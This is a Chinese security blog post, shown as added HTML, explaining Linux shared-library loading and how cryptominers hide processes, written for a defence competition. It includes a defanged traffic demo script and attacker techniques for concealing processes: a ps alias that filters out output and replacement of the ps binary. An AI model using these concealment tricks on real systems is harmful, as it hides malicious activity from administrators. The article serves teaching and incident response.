@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>实景防御赛Linux库文件劫持技术浅析 | Polo&#39;s Blog</title>
+  <meta name="description" content="写在前面很久没写博客了，感觉已经摆烂了很久，所以今天下定决心要把之前遇到的一个点解决掉。 去年打广东省强网杯决赛的时候上午算是安全运维赛，遇到了一道题，和Linux库文件劫持有关，于是趁此机会把这个点讲清楚，也算是问了后面网鼎杯半决赛的RDG（实景防御）复习开个好头。 Linux库文件在讲库文件劫持之前需要了解Linux的库文件到底是什么。Linux的库文件分为动态库和静态库。 对于静态库文件来说">
+<meta property="og:type" content="article">
+<meta property="og:title" content="实景防御赛Linux库文件劫持技术浅析">
+<meta property="og:url" content="https://polosec.github.io/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="写在前面很久没写博客了，感觉已经摆烂了很久，所以今天下定决心要把之前遇到的一个点解决掉。 去年打广东省强网杯决赛的时候上午算是安全运维赛，遇到了一道题，和Linux库文件劫持有关，于是趁此机会把这个点讲清楚，也算是问了后面网鼎杯半决赛的RDG（实景防御）复习开个好头。 Linux库文件在讲库文件劫持之前需要了解Linux的库文件到底是什么。Linux的库文件分为动态库和静态库。 对于静态库文件来说">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010224805161.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010224824880.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010224840262.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010225826208.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010230125471.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010230329912.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010231322097.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221010231442938.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012102734594.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012102751965.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012103737290.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012104955791.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012111811033.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012111901427.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012111932986.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012112802802.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012112816426.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012105521366.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012105701680.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012110448820.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012110606228.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012121912315.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012121937944.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012122059986.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012122137108.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012122414324.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012123303808.png">
+<meta property="og:image" content="http://cdn.polowong.top/image-20221012123323906.png">
+<meta property="article:published_time" content="2022-10-10T14:24:44.000Z">
+<meta property="article:modified_time" content="2022-10-12T04:35:07.438Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="awd">
+<meta property="article:tag" content="rdg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/image-20221010224805161.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://polosec.github.io/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Polo&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+    <link href="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.css" rel="stylesheet">
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/polosec" target="_blank">
+          <img class="img-circle img-rotate" src="http://cdn.polowong.top/1.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Polo</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer&amp;Cybersec Researcher</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Beijing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/polosec" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>null</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/git/">git</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%9F%BA%E7%A1%80/">web基础</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/wp/">wp</a><span class="category-list-count">5</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0307xctf/" rel="tag">0307xctf</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buu/" rel="tag">buu</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c++</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c%E8%AF%AD%E8%A8%80/" rel="tag">c语言</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/" rel="tag">misc</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a><span class="tag-list-count">5</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rdg/" rel="tag">rdg</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a><span class="tag-list-count">29</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%96%E8%AF%81/" rel="tag">取证</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82%E9%A1%B9/" rel="tag">杂项</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="tag">流量分析</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" rel="tag">红队技能</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/0307xctf/" style="font-size: 13.33px;">0307xctf</a> <a href="/tags/awd/" style="font-size: 13.17px;">awd</a> <a href="/tags/buu/" style="font-size: 13.5px;">buu</a> <a href="/tags/buuoj/" style="font-size: 13.5px;">buuoj</a> <a href="/tags/c/" style="font-size: 13px;">c++</a> <a href="/tags/ctf/" style="font-size: 13px;">ctf</a> <a href="/tags/c%E8%AF%AD%E8%A8%80/" style="font-size: 13px;">c语言</a> <a href="/tags/git/" style="font-size: 13px;">git</a> <a href="/tags/linux/" style="font-size: 13.17px;">linux</a> <a href="/tags/misc/" style="font-size: 13.83px;">misc</a> <a href="/tags/mysql/" style="font-size: 13.17px;">mysql</a> <a href="/tags/php/" style="font-size: 13.67px;">php</a> <a href="/tags/rdg/" style="font-size: 13px;">rdg</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 13px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 13.17px;">内网渗透</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13px;">反序列化</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size: 13px;">取证</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 13.17px;">密码学</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 13px;">杂项</a> <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" style="font-size: 13px;">流量分析</a> <a href="/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/" style="font-size: 13px;">红队技能</a> <a href="/tags/%E7%BD%91%E7%BB%9C/" style="font-size: 13.17px;">网络</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">October 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">May 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">16</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/" class="title">实景防御赛Linux库文件劫持技术浅析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-10-10T14:24:44.000Z" itemprop="datePublished">2022-10-10</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/13/java-cc1%E5%88%86%E6%9E%90/" class="title">Ysoserial Commons-Collections 1分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-13T05:28:06.000Z" itemprop="datePublished">2022-05-13</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/07/%E4%BB%8E0%E8%A7%A3%E6%9E%90-ysoserial-URLDNS%E9%93%BE/" class="title">从0解析 ysoserial URLDNS链</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-07T15:52:55.000Z" itemprop="datePublished">2022-05-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/04/14/vulntarget-d-WriteUp/" class="title">vulntarget-d WriteUp</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-04-14T14:53:01.000Z" itemprop="datePublished">2022-04-14</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/04/05/Vulntarget-c-WriteUp/" class="title">Vulntarget-c WriteUp</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-04-04T16:00:15.000Z" itemprop="datePublished">2022-04-05</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-实景防御赛Linux库文件劫持技术浅析" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      实景防御赛Linux库文件劫持技术浅析
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/" class="article-date">
+	  <time datetime="2022-10-10T14:24:44.000Z" itemprop="datePublished">2022-10-10</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/awd/" rel="tag">awd</a>, <a class="article-tag-link-link" href="/tags/rdg/" rel="tag">rdg</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/10/10/%E5%AE%9E%E6%99%AF%E9%98%B2%E5%BE%A1%E8%B5%9BLinux%E5%BA%93%E6%96%87%E4%BB%B6%E5%8A%AB%E6%8C%81%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2.3k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 9(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>很久没写博客了，感觉已经摆烂了很久，所以今天下定决心要把之前遇到的一个点解决掉。</p>
+<p>去年打广东省强网杯决赛的时候上午算是安全运维赛，遇到了一道题，和Linux库文件劫持有关，于是趁此机会把这个点讲清楚，也算是问了后面网鼎杯半决赛的RDG（实景防御）复习开个好头。</p>
+<h1 id="Linux库文件"><a href="#Linux库文件" class="headerlink" title="Linux库文件"></a>Linux库文件</h1><p>在讲库文件劫持之前需要了解Linux的库文件到底是什么。Linux的库文件分为动态库和静态库。</p>
+<p>对于静态库文件来说，所有代码在编译的时候就会被加载，因此可执行程序体积较大。</p>
+<p>本次主要讨论动态库，在编译时引入动态库(so)并不会将动态库中的代码编译到可执行程序中，而是在可执行程序中记录了对so文件的引用，当执行时，才会去加载so文件，以节省内存空间。</p>
+<h2 id="动态库文件加载顺序"><a href="#动态库文件加载顺序" class="headerlink" title="动态库文件加载顺序"></a>动态库文件加载顺序</h2><ol>
+<li><p>gcc 编译时指定的运行时库路径 -Wl,-rpath</p>
+</li>
+<li><p>环境变量 LD_LIBRARY_PATH</p>
+</li>
+<li><p>ldconfig 缓存 /etc/ld.so.cache</p>
+</li>
+<li><p>系统默认库位置 /lib   /usr/lib</p>
+</li>
+</ol>
+<h2 id="第一个Linux动态库demo"><a href="#第一个Linux动态库demo" class="headerlink" title="第一个Linux动态库demo"></a>第一个Linux动态库demo</h2><p>为了模拟赛时场景，需要写一个so文件并且调用，先写一个最简单的demo，后面再将赛时场景加入。</p>
+<p>当前有三个文件，分别是main.c add.c add.h</p>
+<p>内容分别如下</p>
+<p>main.c:</p>
+<p><img src="http://cdn.polowong.top/image-20221010224805161.png" alt="image-20221010224805161"></p>
+<p>add.c:</p>
+<p><img src="http://cdn.polowong.top/image-20221010224824880.png" alt="image-20221010224824880"></p>
+<p>Add.h:</p>
+<p><img src="http://cdn.polowong.top/image-20221010224840262.png" alt="image-20221010224840262"></p>
+<p>add.c中定义了方法adds，返回a+b的值，add.h中给出了方法adds的声明</p>
+<p>main.c中调用了adds方法并且输出值</p>
+<h3 id="生成so文件"><a href="#生成so文件" class="headerlink" title="生成so文件"></a>生成so文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc add.c -fPIC -shared -o libadd.so</span><br></pre></td></tr></table></figure>
+
+<p>-fPIC是编译选项，PIC是 Position Independent Code 的缩写，表示要生成位置无关的代码，这是动态库需要的特性； -shared是链接选项，告诉gcc生成动态库而不是可执行文件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -L. -ladd -o main</span><br></pre></td></tr></table></figure>
+
+<p>-ladd表示链接<strong>libadd.so</strong>文件</p>
+<p>-L.表示搜索要链接的库文件时包含当前路径。</p>
+<p>注意，如果同一目录下同时存在同名的动态库和静态库，比如 libadd.so 和 libadd.a 都在当前路径下， 则gcc会优先链接动态库。</p>
+<p>最后生成的为main可执行文件</p>
+<p>直接执行会报错，提示</p>
+<p> ./main: error while loading shared libraries: libadd.so: cannot open shared object file: No such file or directory  </p>
+<p>出现这个错误的原因是没有找到libadd.so文件，原来Linux是通过 /etc/ld.so.cache 文件搜寻要链接的动态库的。 而 /etc/ld.so.cache 是 ldconfig 程序读取 /etc/ld.so.conf 文件生成的。</p>
+<p>所以，需要修改/etc/ld.so.conf文件内容，添加so文件的路径，并且使用ldconfig命令更新。</p>
+<p><img src="http://cdn.polowong.top/image-20221010225826208.png" alt="image-20221010225826208"></p>
+<h2 id="ldd与nm命令"><a href="#ldd与nm命令" class="headerlink" title="ldd与nm命令"></a>ldd与nm命令</h2><p><strong>ldd</strong>命令可以查看一个可执行程序依赖的共享库,比如刚才写的libadd.so</p>
+<p><img src="http://cdn.polowong.top/image-20221010230125471.png" alt="image-20221010230125471"></p>
+<p><strong>nm</strong>命令</p>
+<p>查看一个库中到底有哪些函数，<strong>nm</strong>命令可以打印出库中的涉及到的所有符号。</p>
+<p><img src="http://cdn.polowong.top/image-20221010230329912.png" alt="image-20221010230329912"></p>
+<h2 id="strace命令"><a href="#strace命令" class="headerlink" title="strace命令"></a>strace命令</h2><p>strace命令用于跟踪系统调用，常用命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -o output.txt -T -tt -e trace&#x3D;all -p 28979</span><br></pre></td></tr></table></figure>
+
+<p>上面的含义是 跟踪28979进程的所有系统调用（-e trace=all），并统计系统调用的花费时间，以及开始时间（并以可视化的时分秒格式显示），最后将记录结果存在output.txt文件里面。</p>
+<p>通过strace可以看到调用了哪些动态链接库，例如下面给出的whoami的例子（后面一张图是截的别人的，自己的好像没有看到那么多库）</p>
+<p><img src="http://cdn.polowong.top/image-20221010231322097.png" alt="image-20221010231322097"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace /usr/bin/whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="http://cdn.polowong.top/image-20221010231442938.png" alt="image-20221010231442938"></p>
+<h1 id="挖矿场景下的动态库劫持分析"><a href="#挖矿场景下的动态库劫持分析" class="headerlink" title="挖矿场景下的动态库劫持分析"></a>挖矿场景下的动态库劫持分析</h1><p>在处理过的挖矿事件中，挖矿程序通常会隐藏真实的挖矿进程，导致通过ps top等命令无法看到挖矿进程。</p>
+<p>写一个类似的demo去模拟该场景,我自己服务器性能太差了 跑不动，就把socket连接换成了print ok</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_traffic</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">     <span class="built_in">print</span> <span class="string">&quot;Sending burst to &quot;</span> + ip + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">     <span class="comment">#sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span></span><br><span class="line">     <span class="comment">#sock.connect((ip, port))</span></span><br><span class="line">     <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># sock.send(&quot;I AM A BAD BOY&quot;) </span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">     <span class="built_in">print</span> <span class="string">&quot;Usage: &quot;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; IP PORT&quot;</span></span><br><span class="line">     sys.exit() </span><br><span class="line"></span><br><span class="line">send_traffic(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])) Let’s go! </span><br></pre></td></tr></table></figure>
+
+<p>python2 evil.py 1.1.1.1 8888</p>
+<p>运行之后使用top命令和ps aux 可以看到所运行的进程</p>
+<p><img src="http://cdn.polowong.top/image-20221012102734594.png" alt="image-20221012102734594"></p>
+<p><img src="http://cdn.polowong.top/image-20221012102751965.png" alt="image-20221012102751965"></p>
+<p>接下来挖矿程序的目的是隐藏该CPU/内存占用率过高的进程。</p>
+<p>简单地说，ps命令是通过遍历/proc目录获取与进程相关的信息（pid status cmdline等）</p>
+<h2 id="进程隐藏方法"><a href="#进程隐藏方法" class="headerlink" title="进程隐藏方法"></a>进程隐藏方法</h2><h3 id="alias命令"><a href="#alias命令" class="headerlink" title="alias命令"></a>alias命令</h3><p>alias ‘ps’=’ps aux | grep -v python’</p>
+<p>这里的python可以换成任意目标字符串或者获取到的pid</p>
+<h3 id="替换二进制文件"><a href="#替换二进制文件" class="headerlink" title="替换二进制文件"></a>替换二进制文件</h3><p>默认ps的链接文件为</p>
+<p><img src="http://cdn.polowong.top/image-20221012103737290.png" alt="image-20221012103737290"></p>
+<p>可以通过替换ps命令或者新建连接实现二进制文件替换/修改，如将ps删除，新上传一个恶意的ps，实现进程隐藏。</p>
